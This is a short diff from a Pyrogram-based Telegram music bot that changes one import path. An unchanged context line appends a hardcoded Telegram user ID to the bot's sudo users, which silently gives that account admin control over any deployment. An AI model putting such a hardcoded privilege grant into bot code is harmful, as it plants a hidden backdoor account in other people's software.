@@ -2,7 +2,7 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 from AsuXMusic.config import SUDO_USERS
-from Process.admins import get_administrators
+from AsuX.admins import get_administrators
 
 SUDO_USERS.append(5938660179)
 
